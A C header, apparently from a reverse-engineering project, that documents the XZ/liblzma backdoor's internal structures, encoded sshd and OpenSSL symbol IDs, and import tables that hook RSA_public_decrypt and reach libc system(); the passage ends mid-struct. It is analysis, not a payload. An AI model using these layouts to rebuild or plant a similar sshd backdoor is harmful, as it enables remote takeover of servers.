/**
 * @file xzre.h
 * @author Stefano Moioli (smxdev4@gmail.com)
 * @brief XZ backdoor structures and functions
 * 
 */
#ifndef __XZRE_H
#define __XZRE_H

#ifndef XZRE_SLIM
#define _GNU_SOURCE
#include <assert.h>
#include <link.h>
#include <stddef.h>
#include <stdint.h>
#include <sys/select.h>
#endif

typedef uint8_t u8;
typedef uint16_t u16;
typedef uint32_t u32;
typedef uint64_t u64;
typedef uintptr_t uptr;

#ifdef XZRE_SLIM
typedef unsigned int pid_t;
typedef unsigned int uid_t;
typedef unsigned int gid_t;
typedef unsigned int mode_t;
typedef uint32_t Elf32_Addr;
typedef uint64_t Elf64_Addr;
typedef uptr
	Elf32_Sym, Elf64_Ehdr, Elf64_Phdr, Elf64_Dyn, Elf64_Sym, Elf64_Rela, Elf64_Relr, 
	Elf64_Verdef, Elf64_Versym, sigset_t, fd_set, EVP_PKEY, RSA, DSA, 
	BIGNUM, EC_POINT, EC_KEY, EC_GROUP, EVP_MD, point_conversion_form_t,
	EVP_CIPHER, EVP_CIPHER_CTX, ENGINE, EVP_MD_CTX, EVP_PKEY_CTX, BN_CTX;
typedef struct {
	void *(*alloc)(void *opaque, size_t nmemb, size_t size);
	void (*free)(void *opaque, void *ptr);
	void *opaque;
} lzma_allocator;

typedef long int Lmid_t;
#define ElfW(Sym) Elf64_Sym
#endif

#ifndef XZRE_SLIM
#include <lzma.h>
#include <openssl/dsa.h>
#include <openssl/ec.h>
#include <openssl/evp.h>
#include <openssl/rsa.h>
#include <elf.h>
#include <link.h>
typedef Elf64_Xword Elf64_Relr;
#endif

#define UPTR(x) ((uptr)(x))
#define PTRADD(a, b) (UPTR(a) + UPTR(b))
#define PTRDIFF(a, b) (UPTR(a) - UPTR(b))

/*
 * Force a compilation error if condition is true, but also produce a
 * result (of value 0 and type int), so the expression can be used
 * e.g. in a structure initializer (or where-ever else comma expressions
 * aren't permitted).
 */
#define BUILD_BUG_ON_ZERO(e) ((int)(sizeof(struct { int:(-!!(e)); })))
#define __same_type(a, b) __builtin_types_compatible_p(typeof(a), typeof(b))
#define __must_be_array(a) BUILD_BUG_ON_ZERO(__same_type((a), &(a)[0]))
#define ARRAY_SIZE(arr) (sizeof(arr) / sizeof((arr)[0]) + __must_be_array(arr))

// copied from https://sourceware.org/git/?p=glibc.git;a=blob;f=include/link.h;h=bef2820b40cd553c77990dcda4f4ccf0203a9110;hb=f94f6d8a3572840d3ba42ab9ace3ea522c99c0c2#l360
struct auditstate
{
 		uintptr_t cookie;
 		unsigned int bindflags;
};

typedef struct link_map *lookup_t;

struct La_i86_regs;
struct La_i86_retval;
struct La_x86_64_regs;
struct La_x86_64_retval;
struct La_x32_regs;
struct La_x32_retval;

// copied from https://sourceware.org/git/?p=glibc.git;a=blob;f=sysdeps/generic/ldsodefs.h;h=2ebe7901c03ade2da466d8a2bf1e1214ef8f54d1;hb=f94f6d8a3572840d3ba42ab9ace3ea522c99c0c2#l256
// and https://sourceware.org/git/?p=glibc.git;a=blob;f=sysdeps/x86/ldsodefs.h;h=50dc81c02249bc8e034842066428452f6c00aec3;hb=57581acd9559217e859fdac693145ce6399f4d70
struct audit_ifaces
{
	void (*activity) (uintptr_t *, unsigned int);
	char *(*objsearch) (const char *, uintptr_t *, unsigned int);
	unsigned int (*objopen) (struct link_map *, Lmid_t, uintptr_t *);
	void (*preinit) (uintptr_t *);
	union
	{
		uintptr_t (*symbind32) (Elf32_Sym *, unsigned int, uintptr_t *,
			uintptr_t *, unsigned int *, const char *);
		uintptr_t (*symbind64) (Elf64_Sym *, unsigned int, uintptr_t *,
			uintptr_t *, unsigned int *, const char *);
	};
	union
	{
		Elf32_Addr (*i86_gnu_pltenter) (Elf32_Sym *, unsigned int, uintptr_t *,
			uintptr_t *, struct La_i86_regs *,
			unsigned int *, const char *name,
			long int *framesizep);
		Elf64_Addr (*x86_64_gnu_pltenter) (Elf64_Sym *, unsigned int,
			uintptr_t *,
			uintptr_t *, struct La_x86_64_regs *,
			unsigned int *, const char *name,
			long int *framesizep);
		Elf32_Addr (*x32_gnu_pltenter) (Elf32_Sym *, unsigned int, uintptr_t *,
			uintptr_t *, struct La_x32_regs *,
			unsigned int *, const char *name,
			long int *framesizep);
	};
	union
	{
 		unsigned int (*i86_gnu_pltexit) (Elf32_Sym *, unsigned int, uintptr_t *,
			uintptr_t *, const struct La_i86_regs *,
			struct La_i86_retval *, const char *);
		unsigned int (*x86_64_gnu_pltexit) (Elf64_Sym *, unsigned int,
			uintptr_t *,
			uintptr_t *,
			const struct La_x86_64_regs *,
			struct La_x86_64_retval *,
			const char *);
		unsigned int (*x32_gnu_pltexit) (Elf32_Sym *, unsigned int, uintptr_t *,
			uintptr_t *,
			const struct La_x32_regs *,
			struct La_x86_64_retval *,
			const char *);
	};
	unsigned int (*objclose) (uintptr_t *);

	struct audit_ifaces *next;
};

// opcode is always +0x80 for the sake of it (yet another obfuscation)
#define XZDASM_OPC(op) (op - 0x80)

typedef int BOOL;

#define TRUE 1
#define FALSE 0

typedef enum {
	// has lock prefix
	DF_LOCK_REP = 1,
	// has segment (ds/es) override
	DF_SEG = 2,
	// has operand size override
	DF_OSIZE = 4,
	// has address size override
	DF_ASIZE = 8,
	// vex instruction
	DF_VEX = 0x10,
	// has rex
	DF_REX = 0x20,
	// has modrm
	DF_MODRM = 0x40,
	// has sib
	DF_SIB = 0x80
} InstructionFlags;

typedef enum {
	// memory with displacement
	DF_MEM_DISP = 0x1,
	// 8-bit displacement
	DF_MEM_DISP8 = 0x2,
	// memory seg+offs (0xa0-0xa3)
	DF_MEM_SEG_OFFS = 0x4,
	// has immediate
	DF_IMM = 0x8,
	// 64-bit immediate (movabs)
	DF_IMM64 = 0x10
} InstructionFlags2;

typedef enum {
	// ELF has JMPREL relocs
	X_ELF_PLTREL = 0x1,
	// ELF has RELA relocs
	X_ELF_RELA = 0x2,
	// ELF has RELR relocs
	X_ELF_RELR = 0x4,
	// ELF has DT_VERSYM
	X_ELF_VERSYM = 0x10,
	// ELF has DF_1_NOW
	X_ELF_NOW = 0x20
} ElfFlags;

typedef enum {
	// register-indirect addressing or no displacement
	MRM_I_REG, // 00
	// indirect with one byte displacement
	MRM_I_DISP1, // 01
	// indirect with four byte displacement
	MRM_I_DISP4, // 10
	// direct-register addressing
	MRM_D_REG // 11
} ModRm_Mod;

typedef enum {
	// find function beginning by looking for endbr64
	FIND_ENDBR64,
	// find function beginning by looking for padding,
	// then getting the instruction after it
	FIND_NOP
} FuncFindType;

typedef enum {
	/**
	 * @brief this is for sshd itself
	 * 
	 */
	X_ELF_MAIN = 0,
	X_ELF_DYNAMIC_LINKER = 1,
	X_ELF_LIBC = 2,
	X_ELF_LIBCRYPTO = 3
} ElfId;

typedef enum {
	XREF_xcalloc_zero_size = 0,
	XREF_Could_not_chdir_to_home_directory_s_s = 1,
	XREF_list_hostkey_types = 2,
	XREF_demote_sensitive_data = 3,
	XREF_mm_terminate = 4,
	XREF_mm_pty_allocate = 5,
	XREF_mm_do_pam_account = 6,
	XREF_mm_session_pty_cleanup2 = 7,
	XREF_mm_getpwnamallow = 8,
	XREF_mm_sshpam_init_ctx = 9,
	XREF_mm_sshpam_query = 10,
	XREF_mm_sshpam_respond = 11,
	XREF_mm_sshpam_free_ctx = 12,
	XREF_mm_choose_dh = 13,
	XREF_sshpam_respond = 14,
	XREF_sshpam_auth_passwd = 15,
	XREF_sshpam_query = 16,
	XREF_start_pam = 17,
	XREF_mm_request_send = 18,
	XREF_mm_log_handler = 19,
	XREF_Could_not_get_agent_socket = 20,
	XREF_auth_root_allowed = 21,
	XREF_mm_answer_authpassword = 22,
	XREF_mm_answer_keyallowed = 23,
	XREF_mm_answer_keyverify = 24,
	XREF_48s_48s_d_pid_ld_ = 25,
	XREF_Unrecognized_internal_syslog_level_code_d = 26
} StringXrefId;

typedef enum {
	STR_from = 0x810,
	STR_ssh2 = 0x678,
	STR_48s_48s_d_pid_ld_ = 0xd8,
	STR_s = 0x708,
	STR_usr_sbin_sshd = 0x108,
	STR_Accepted_password_for = 0x870,
	STR_Accepted_publickey_for = 0x1a0,
	STR_BN_bin2bn = 0xc40,
	STR_BN_bn2bin = 0x6d0,
	STR_BN_dup = 0x958,
	STR_BN_free = 0x418,
	STR_BN_num_bits = 0x4e0,
	STR_Connection_closed_by = 0x790,
	STR_Could_not_chdir_to_home_directory_s_s = 0x18,
	STR_Could_not_get_agent_socket = 0xb0,
	STR_DISPLAY = 0x960,
	STR_DSA_get0_pqg = 0x9d0,
	STR_DSA_get0_pub_key = 0x468,
	STR_EC_KEY_get0_group = 0x7e8,
	STR_EC_KEY_get0_public_key = 0x268,
	STR_EC_POINT_point2oct = 0x6e0,
	STR_EVP_CIPHER_CTX_free = 0xb28,
	STR_EVP_CIPHER_CTX_new = 0x838,
	STR_EVP_DecryptFinal_ex = 0x2a8,
	STR_EVP_DecryptInit_ex = 0xc08,
	STR_EVP_DecryptUpdate = 0x3f0,
	STR_EVP_Digest = 0xf8,
	STR_EVP_DigestVerify = 0x408,
	STR_EVP_DigestVerifyInit = 0x118,
	STR_EVP_MD_CTX_free = 0xd10,
	STR_EVP_MD_CTX_new = 0xaf8,
	STR_EVP_PKEY_free = 0x6f8,
	STR_EVP_PKEY_new_raw_public_key = 0x758,
	STR_EVP_PKEY_set1_RSA = 0x510,
	STR_EVP_chacha20 = 0xc28,
	STR_EVP_sha256 = 0xc60,
	STR_EVP_sm = 0x188,
	STR_GLIBC_2_2_5 = 0x8c0,
	STR_GLRO_dl_naudit_naudit = 0x6a8,
	STR_KRB5CCNAME = 0x1e0,
	STR_LD_AUDIT = 0xcf0,
	STR_LD_BIND_NOT = 0xbc0,
	STR_LD_DEBUG = 0xa90,
	STR_LD_PROFILE = 0xb98,
	STR_LD_USE_LOAD_BIAS = 0x3e0,
	STR_LINES = 0xa88,
	STR_RSA_free = 0xac0,
	STR_RSA_get0_key = 0x798,
	STR_RSA_new = 0x918,
	STR_RSA_public_decrypt = 0x1d0,
	STR_RSA_set0_key = 0x540,
	STR_RSA_sign = 0x8f8,
	STR_SSH_2_0 = 0x990,
	STR_TERM = 0x4a8,
	STR_Unrecognized_internal_syslog_level_code_d = 0xe0,
	STR_WAYLAND_DISPLAY = 0x158,
	STR_errno_location = 0x878,
	STR_libc_stack_end = 0x2b0,
	STR_libc_start_main = 0x228,
	STR_dl_audit_preinit = 0xa60,
	STR_dl_audit_symbind_alt = 0x9c8,
	STR_exit = 0x8a8,
	STR_r_debug = 0x5b0,
	STR_rtld_global = 0x5b8,
	STR_rtld_global_ro = 0xa98,
	STR_auth_root_allowed = 0xb8,
	STR_authenticating = 0x1d8,
	STR_demote_sensitive_data = 0x28,
	STR_getuid = 0x348,
	STR_ld_linux_x86_64_so = 0xa48,
	STR_libc_so = 0x7d0,
	STR_libcrypto_so = 0x7c0,
	STR_liblzma_so = 0x590,
	STR_libsystemd_so = 0x938,
	STR_list_hostkey_types = 0x20,
	STR_malloc_usable_size = 0x440,
	STR_mm_answer_authpassword = 0xc0,
	STR_mm_answer_keyallowed = 0xc8,
	STR_mm_answer_keyverify = 0xd0,
	STR_mm_answer_pam_start = 0x948,
	STR_mm_choose_dh = 0x78,
	STR_mm_do_pam_account = 0x40,
	STR_mm_getpwnamallow = 0x50,
	STR_mm_log_handler = 0xa8,
	STR_mm_pty_allocate = 0x38,
	STR_mm_request_send = 0xa0,
	STR_mm_session_pty_cleanup2 = 0x48,
	STR_mm_sshpam_free_ctx = 0x70,
	STR_mm_sshpam_init_ctx = 0x58,
	STR_mm_sshpam_query = 0x60,
	STR_mm_sshpam_respond = 0x68,
	STR_mm_terminate = 0x30,
	STR_parse_PAM = 0xc58,
	STR_password = 0x400,
	STR_preauth = 0x4f0,
	STR_pselect = 0x690,
	STR_publickey = 0x7b8,
	STR_read = 0x308,
	STR_rsa_sha2_256 = 0x710,
	STR_setlogmask = 0x428,
	STR_setresgid = 0x5f0,
	STR_setresuid = 0xab8,
	STR_shutdown = 0x760,
	STR_ssh_2_0 = 0xd08,
	STR_ssh_rsa_cert_v01_openssh_com = 0x2c8,
	STR_sshpam_auth_passwd = 0x88,
	STR_sshpam_query = 0x90,
	STR_sshpam_respond = 0x80,
	STR_start_pam = 0x98,
	STR_system = 0x9f8,
	STR_unknown = 0x198,
	STR_user = 0xb10,
	STR_write = 0x380,
	STR_xcalloc_zero_size = 0x10,
	STR_yolAbejyiejuvnupEvjtgvsh5okmkAvj = 0xb00,
	STR_ELF = 0x300,
} EncodedStringId;

#ifndef XZRE_SLIM
#define assert_offset(t, f, o) static_assert(offsetof(t, f) == o)
#else
#define assert_offset(t, f, o) 
#endif

#define CONCAT(x, y) x ## y
#define EXPAND(x, y) CONCAT(x, y)
#define PADDING(size) u8 EXPAND(_unknown, __LINE__)[size]

struct sshbuf;
struct kex;

/**
 * @brief struct monitor from openssh-portable
 */
struct monitor {
	int			 m_recvfd;
	int			 m_sendfd;
	int			 m_log_recvfd;
	int			 m_log_sendfd;
	struct kex		**m_pkex;
	pid_t			 m_pid;
};

/**
 * @brief struct sensitive_data from openssh-portable
 */
struct sensitive_data {
	struct sshkey	**host_keys;		/* all private host keys */
	struct sshkey	**host_pubkeys;		/* all public host keys */
	struct sshkey	**host_certificates;	/* all public host certificates */
	int		have_ssh2_key;
};

/**
 * @brief struct sshkey from openssh-portable
 * 
 */
struct sshkey {
	int	 type;
	int	 flags;
	/* KEY_RSA */
	RSA	*rsa;
	/* KEY_DSA */
	DSA	*dsa;
	/* KEY_ECDSA and KEY_ECDSA_SK */
	int ecdsa_nid;	/* NID of curve */
	EC_KEY *ecdsa;
	/* KEY_ED25519 and KEY_ED25519_SK */
	u8 *ed25519_sk;
	u8 *ed25519_pk;
	/* KEY_XMSS */
	char *xmss_name;
	char *xmss_filename;	/* for state file updates */
	void *xmss_state;	/* depends on xmss_name, opaque */
	u8 *xmss_sk;
	u8 *xmss_pk;
	/* KEY_ECDSA_SK and KEY_ED25519_SK */
	char sk_application;
	u8 sk_flags;
	struct sshbuf *sk_key_handle;
	struct sshbuf *sk_reserved;
	/* Certificates */
	struct sshkey_cert *cert;
	/* Private key shielding */
	u8 *shielded_private;
	size_t	shielded_len;
	u8 *shield_prekey;
	size_t	shield_prekey_len;
};

typedef struct __attribute__((packed)) elf_entry_ctx {
	/**
	 * @brief points to a symbol in memory
	 * will be used to find the GOT value
	 */
	void *symbol_ptr;
	/**
	 * @brief points to the Global Offset Table
	 */
	void *got_ptr;
	/**
	 * @brief the return address value of the caller
	 * obtained from *(u64 *)(caller_locals+24)
	 * since the entrypoint passes __builtin_frame_address(0)-16,
	 * this results in an offset of +8
	 */
	void *return_address;
	/**
	 * @brief points to the real cpuid function
	 */
	void *cpuid_fn;
	/**
	 * @brief holds the offset of the symbol relative to the GOT.
	 * used to derive the @ref got_ptr
	 */
	ptrdiff_t got_offset;
	/**
	 * @brief stores the value of __builtin_frame_address(0)-16
	 */
	u64 *frame_address;
} elf_entry_ctx_t;

assert_offset(elf_entry_ctx_t, symbol_ptr, 0);
assert_offset(elf_entry_ctx_t, got_ptr, 8);
assert_offset(elf_entry_ctx_t, return_address, 0x10);
assert_offset(elf_entry_ctx_t, cpuid_fn, 0x18);
assert_offset(elf_entry_ctx_t, got_offset, 0x20);
assert_offset(elf_entry_ctx_t, frame_address, 0x28);

typedef struct __attribute__((packed)) dasm_ctx {
	u8* instruction;
	u64 instruction_size;
	union {
		struct __attribute__((packed)) {
			u8 flags;
			u8 flags2;
			PADDING(2);
			u8 lock_rep_byte;
			u8 seg_byte;
			u8 osize_byte;
			u8 asize_byte;
			u8 vex_byte;
			u8 vex_byte2;
			u8 vex_byte3;
			u8 rex_byte;
			union {
				struct __attribute__((packed)) {
					u8 modrm;
					u8 modrm_mod;
					u8 modrm_reg;
					u8 modrm_rm;
				};
				u32 modrm_word;
			};
		};
		u16 flags_u16;
        };
	PADDING(1);
	struct __attribute__((packed)) {
		union {
			struct __attribute__((packed)) {
				u8 sib;
				u8 sib_scale;
				u8 sib_index;
				u8 sib_base;
			};
			u32 sib_word;
		};
	};
	PADDING(3);
	u32 opcode;
	PADDING(4);
	u64 mem_disp;
	// e.g. in CALL
	u64 operand;
	u64 operand_zeroextended;
	u64 operand_size;
	u8 insn_offset;
	PADDING(7);
} dasm_ctx_t;

assert_offset(dasm_ctx_t, instruction, 0);
assert_offset(dasm_ctx_t, instruction_size, 8);
assert_offset(dasm_ctx_t, flags, 0x10);
assert_offset(dasm_ctx_t, flags2, 0x11);
assert_offset(dasm_ctx_t, lock_rep_byte, 0x14);
assert_offset(dasm_ctx_t, seg_byte, 0x15);
assert_offset(dasm_ctx_t, osize_byte, 0x16);
assert_offset(dasm_ctx_t, asize_byte, 0x17);
assert_offset(dasm_ctx_t, vex_byte, 0x18);
assert_offset(dasm_ctx_t, vex_byte2, 0x19);
assert_offset(dasm_ctx_t, vex_byte3, 0x1A);
assert_offset(dasm_ctx_t, rex_byte, 0x1B);
assert_offset(dasm_ctx_t, modrm, 0x1C);
assert_offset(dasm_ctx_t, modrm_mod, 0x1D);
assert_offset(dasm_ctx_t, modrm_reg, 0x1E);
assert_offset(dasm_ctx_t, modrm_rm, 0x1F);
assert_offset(dasm_ctx_t, sib, 0x21);
assert_offset(dasm_ctx_t, sib_scale, 0x22);
assert_offset(dasm_ctx_t, sib_index, 0x23);
assert_offset(dasm_ctx_t, sib_base, 0x24);
assert_offset(dasm_ctx_t, opcode, 0x28);
assert_offset(dasm_ctx_t, mem_disp, 0x30);
assert_offset(dasm_ctx_t, operand, 0x38);
assert_offset(dasm_ctx_t, operand_zeroextended, 0x40);
assert_offset(dasm_ctx_t, operand_size, 0x48);
assert_offset(dasm_ctx_t, insn_offset, 0x50);
static_assert(sizeof(dasm_ctx_t) == 0x58);

typedef struct __attribute__((packed)) elf_info {
	/**
	 * @brief pointed to the ELF base address in memory
	 */
	Elf64_Ehdr *elfbase;
	/**
	 * @brief virtual address of the first program header
	 */
	u64 first_vaddr;
	/**
	 * @brief pointer to the ELF program headers array in memory
	 */
	Elf64_Phdr *phdrs;
	/**
	 * @brief copy of the ELF program header count from the ELF header
	 */
	u64 e_phnum;
	/**
	 * @brief pointer to the ELF dynamic segment
	 */
	Elf64_Dyn *dyn;
	/**
	 * @brief number of entries in the ELF dynamic segment
	 */
	u64 dyn_num_entries;
	/**
	 * @brief pointer to the ELF string table
	 */
	char *strtab;
	/**
	 * @brief pointer to the ELF symbol table
	 */
	Elf64_Sym *symtab;
	/**
	 * @brief pointer to the ELF PLT relocations table
	 */
	Elf64_Rela *plt_relocs;
	/**
	 * @brief number of entries in the PLT relocation table
	 */
	u32 plt_relocs_num;
	/**
	 * @brief whether the loaded ELF contains PT_GNU_RELRO or not
	 * which specifies the location and size of a segment which
	 * may be made read-only after relocations have been processed.
	 */
	BOOL gnurelro_found;
	/**
	 * @brief location of the GNU relro segment
	 */
	u64 gnurelro_vaddr;
	/**
	 * @brief size of the GNU relro segment
	 */
	u64 gnurelro_memsize;
	/**
	 * @brief pointer to the EFL symbol versioning  (from DT_VERDEF)
	 */
	Elf64_Verdef *verdef;
	/**
	 * @brief number of entries in the symbol versioning table
	 */
	u64 verdef_num;
	Elf64_Versym *versym;
	Elf64_Rela *rela_relocs;
	u32 rela_relocs_num;
	u32 _unused0;
	Elf64_Relr *relr_relocs;
	u32 relr_relocs_num;
	PADDING(4);
	/**
	 * @brief
	 * page-aligned virtual address of the first executable ELF segment
	 */
	u64 code_segment_start;
	/**
	 * @brief 
	 * page-aligned virtual size of the first executable ELF segment
	 */
	u64 code_segment_size;

	u64 rodata_segment_start;
	u64 rodata_segment_size;
	u64 data_segment_start;
	u64 data_segment_size;
	u64 data_segment_alignment;

	u8 flags;
	PADDING(7);
	/**
	 * @brief number of GNU hash buckets (from DT_GNU_HASH)
	 */
	u32 gnu_hash_nbuckets;
	/**
	 * @brief last valid bloom value
	 */
	u32 gnu_hash_last_bloom;
	u32 gnu_hash_bloom_shift;
	PADDING(4);
	u64 *gnu_hash_bloom;
	u32 *gnu_hash_buckets;
	u32 *gnu_hash_chain;
} elf_info_t;

assert_offset(elf_info_t, elfbase, 0x0);
assert_offset(elf_info_t, first_vaddr, 0x8);
assert_offset(elf_info_t, phdrs, 0x10);
assert_offset(elf_info_t, e_phnum, 0x18);
assert_offset(elf_info_t, dyn, 0x20);
assert_offset(elf_info_t, dyn_num_entries, 0x28);
assert_offset(elf_info_t, strtab, 0x30);
assert_offset(elf_info_t, symtab, 0x38);
assert_offset(elf_info_t, plt_relocs, 0x40);
assert_offset(elf_info_t, plt_relocs_num, 0x48);
assert_offset(elf_info_t, gnurelro_found, 0x4C);
assert_offset(elf_info_t, gnurelro_vaddr, 0x50);
assert_offset(elf_info_t, gnurelro_memsize, 0x58);
assert_offset(elf_info_t, verdef, 0x60);
assert_offset(elf_info_t, verdef_num, 0x68);
assert_offset(elf_info_t, versym, 0x70);
assert_offset(elf_info_t, rela_relocs, 0x78);
assert_offset(elf_info_t, rela_relocs_num, 0x80);
assert_offset(elf_info_t, relr_relocs, 0x88);
assert_offset(elf_info_t, relr_relocs_num, 0x90);
assert_offset(elf_info_t, code_segment_start, 0x98);
assert_offset(elf_info_t, code_segment_size, 0xA0);
assert_offset(elf_info_t, rodata_segment_start, 0xA8);
assert_offset(elf_info_t, rodata_segment_size, 0xB0);
assert_offset(elf_info_t, data_segment_start, 0xB8);
assert_offset(elf_info_t, data_segment_size, 0xC0);
assert_offset(elf_info_t, data_segment_alignment, 0xC8);
assert_offset(elf_info_t, flags, 0xD0);
assert_offset(elf_info_t, gnu_hash_nbuckets, 0xd8);
assert_offset(elf_info_t, gnu_hash_last_bloom, 0xdc);
assert_offset(elf_info_t, gnu_hash_bloom_shift, 0xe0);
assert_offset(elf_info_t, gnu_hash_bloom, 0xe8);
assert_offset(elf_info_t, gnu_hash_buckets, 0xf0);
assert_offset(elf_info_t, gnu_hash_chain, 0xf8);
static_assert(sizeof(elf_info_t) == 0x100);

typedef struct __attribute__((packed)) libc_imports {
	u32 resolved_imports_count;
	PADDING(4);
	size_t (*malloc_usable_size)(void *ptr);
	uid_t (*getuid)(void);
	void (*exit)(int status);
	int (*setresgid)(gid_t rgid, gid_t egid, gid_t sgid); 
	int (*setresuid)(uid_t ruid, uid_t euid, uid_t suid);
	int (*system)(const char *command);
	ssize_t (*write)(int fd, const void *buf, size_t count);
	int (*pselect)(
		int nfds, fd_set *readfds, fd_set *writefds,
		fd_set *exceptfds, const struct timespec *timeout,
		const sigset_t *sigmask);
	ssize_t (*read)(int fd, void *buf, size_t count);
	int *(*__errno_location)(void);
	int (*setlogmask)(int mask);
	int (*shutdown)(int sockfd, int how);
	void *__libc_stack_end;
} libc_imports_t;

assert_offset(libc_imports_t, resolved_imports_count, 0);
assert_offset(libc_imports_t, malloc_usable_size, 8);
assert_offset(libc_imports_t, getuid, 0x10);
assert_offset(libc_imports_t, exit, 0x18);
assert_offset(libc_imports_t, setresgid, 0x20);
assert_offset(libc_imports_t, setresuid, 0x28);
assert_offset(libc_imports_t, system, 0x30);
assert_offset(libc_imports_t, write, 0x38);
assert_offset(libc_imports_t, pselect, 0x40);
assert_offset(libc_imports_t, read, 0x48);
assert_offset(libc_imports_t, __errno_location, 0x50);
assert_offset(libc_imports_t, setlogmask, 0x58);
assert_offset(libc_imports_t, shutdown, 0x60);
static_assert(sizeof(libc_imports_t) == 0x70);

typedef int (*pfn_RSA_public_decrypt_t)(
	int flen, unsigned char *from, unsigned char *to,
	RSA *rsa, int padding);
typedef int (*pfn_EVP_PKEY_set1_RSA_t)(EVP_PKEY *pkey, struct rsa_st *key);
typedef void (*pfn_RSA_get0_key_t)(
	const RSA *r,
	const BIGNUM **n, const BIGNUM **e, const BIGNUM **d);

typedef struct __attribute__((packed)) imported_funcs {
	pfn_RSA_public_decrypt_t RSA_public_decrypt;
	pfn_EVP_PKEY_set1_RSA_t EVP_PKEY_set1_RSA;
	// ???
	void (*RSA_get0_key_null)(
		const RSA *r, const BIGNUM **n,
		const BIGNUM **e, const BIGNUM **d);
	/**
	 * @brief address of the PLT for RSA_public_decrypt() in sshd
	 * 
	 */
	void *RSA_public_decrypt_plt;
	/**
	 * @brief address of the PLT for EVP_PKEY_set1_RSA() in sshd
	 * 
	 */
	void *EVP_PKEY_set1_RSA_plt;
	/**
	 * @brief address of the PLT for RSA_get0_key() in sshd
	 * 
	 */
	void *RSA_get0_key_plt;
	void (*DSA_get0_pqg)(
		const DSA *d, const BIGNUM **p,
		const BIGNUM **q, const BIGNUM **g);
	const BIGNUM *(*DSA_get0_pub_key)(const DSA *d);
	size_t (*EC_POINT_point2oct)(
		const EC_GROUP *group, const EC_POINT *p,
		point_conversion_form_t form, unsigned char *buf,
		size_t len, BN_CTX *ctx);
	EC_POINT *(*EC_KEY_get0_public_key)(const EC_KEY *key);
	const EC_GROUP *(*EC_KEY_get0_group)(const EC_KEY *key);
	EVP_MD *(*EVP_sha256)(void);
	pfn_RSA_get0_key_t RSA_get0_key;
	int (*BN_num_bits)(const BIGNUM *a);
	EVP_PKEY *(*EVP_PKEY_new_raw_public_key)(
		int type, ENGINE *e,
		const unsigned char *key, size_t keylen);
	EVP_MD_CTX *(*EVP_MD_CTX_new)(void);
	int (*EVP_DigestVerifyInit)(
		EVP_MD_CTX *ctx, EVP_PKEY_CTX **pctx,
		const EVP_MD *type, ENGINE *e, EVP_PKEY *pkey);
	int (*EVP_DigestVerify)(
		EVP_MD_CTX *ctx, const unsigned char *sig,
		size_t siglen, const unsigned char *tbs, size_t tbslen);
	void (*EVP_MD_CTX_free)(EVP_MD_CTX *ctx);
	void (*EVP_PKEY_free)(EVP_PKEY *key);
	EVP_CIPHER_CTX *(*EVP_CIPHER_CTX_new)(void);
	int (*EVP_DecryptInit_ex)(
		EVP_CIPHER_CTX *ctx, const EVP_CIPHER *type,
		ENGINE *impl, const unsigned char *key, const unsigned char *iv);
	int (*EVP_DecryptUpdate)(
		EVP_CIPHER_CTX *ctx, unsigned char *out,
		int *outl, const unsigned char *in, int inl);
	int (*EVP_DecryptFinal_ex)(EVP_CIPHER_CTX *ctx, unsigned char *outm, int *outl);
	void (*EVP_CIPHER_CTX_free)(EVP_CIPHER_CTX *ctx);
	const EVP_CIPHER *(*EVP_chacha20)(void);
	RSA *(*RSA_new)(void);
	BIGNUM *(*BN_dup)(const BIGNUM *from);
	BIGNUM (*BN_bin2bn)(const unsigned char *s, int len, BIGNUM *ret);
	int (*RSA_set0_key)(RSA *r, BIGNUM *n, BIGNUM *e, BIGNUM *d);
	int (*EVP_Digest)(
		const void *data, size_t count, unsigned char *md,
		unsigned int *size, const EVP_MD *type, ENGINE *impl);
	int (*RSA_sign)(
		int type,
		const unsigned char *m, unsigned int m_len,
		unsigned char *sigret, unsigned int *siglen, RSA *rsa);
	int (*BN_bn2bin)(const BIGNUM *a, unsigned char *to);
	void (*RSA_free)(RSA *rsa);
	void (*BN_free)(BIGNUM *a);
	libc_imports_t *libc;
	u64 resolved_imports_count;
} imported_funcs_t;

assert_offset(imported_funcs_t, RSA_public_decrypt, 0);
assert_offset(imported_funcs_t, EVP_PKEY_set1_RSA, 8);
assert_offset(imported_funcs_t, RSA_get0_key_null, 0x10);
assert_offset(imported_funcs_t, RSA_public_decrypt_plt, 0x18);
assert_offset(imported_funcs_t, EVP_PKEY_set1_RSA_plt, 0x20);
assert_offset(imported_funcs_t, RSA_get0_key_plt, 0x28);
assert_offset(imported_funcs_t, DSA_get0_pqg, 0x30);
assert_offset(imported_funcs_t, DSA_get0_pub_key, 0x38);
assert_offset(imported_funcs_t, EC_POINT_point2oct, 0x40);
assert_offset(imported_funcs_t, EC_KEY_get0_public_key, 0x48);
assert_offset(imported_funcs_t, EC_KEY_get0_group, 0x50);
assert_offset(imported_funcs_t, EVP_sha256, 0x58);
assert_offset(imported_funcs_t, RSA_get0_key, 0x60);
assert_offset(imported_funcs_t, BN_num_bits, 0x68);
assert_offset(imported_funcs_t, EVP_PKEY_new_raw_public_key, 0x70);
assert_offset(imported_funcs_t, EVP_MD_CTX_new, 0x78);
assert_offset(imported_funcs_t, EVP_DigestVerifyInit, 0x80);
assert_offset(imported_funcs_t, EVP_DigestVerify, 0x88);
assert_offset(imported_funcs_t, EVP_MD_CTX_free, 0x90);
assert_offset(imported_funcs_t, EVP_PKEY_free, 0x98);
assert_offset(imported_funcs_t, EVP_CIPHER_CTX_new, 0xA0);
assert_offset(imported_funcs_t, EVP_DecryptInit_ex, 0xA8);
assert_offset(imported_funcs_t, EVP_DecryptUpdate, 0xB0);
assert_offset(imported_funcs_t, EVP_DecryptFinal_ex, 0xB8);
assert_offset(imported_funcs_t, EVP_CIPHER_CTX_free, 0xC0);
assert_offset(imported_funcs_t, EVP_chacha20, 0xC8);
assert_offset(imported_funcs_t, RSA_new, 0xD0);
assert_offset(imported_funcs_t, BN_dup, 0xD8);
assert_offset(imported_funcs_t, BN_bin2bn, 0xE0);
assert_offset(imported_funcs_t, RSA_set0_key, 0xE8);
assert_offset(imported_funcs_t, EVP_Digest, 0xF0);
assert_offset(imported_funcs_t, RSA_sign, 0xF8);
assert_offset(imported_funcs_t, BN_bn2bin, 0x100);
assert_offset(imported_funcs_t, RSA_free, 0x108);
assert_offset(imported_funcs_t, BN_free, 0x110);
assert_offset(imported_funcs_t, libc, 0x118);
assert_offset(imported_funcs_t, resolved_imports_count, 0x120);
static_assert(sizeof(imported_funcs_t) == 0x128);

struct ssh;
struct sshbuf;

typedef struct __attribute__((packed)) sshd_ctx {
	BOOL have_mm_answer_keyallowed;
	BOOL have_mm_answer_authpassword;
	BOOL have_mm_answer_keyverify;
	PADDING(0x4);
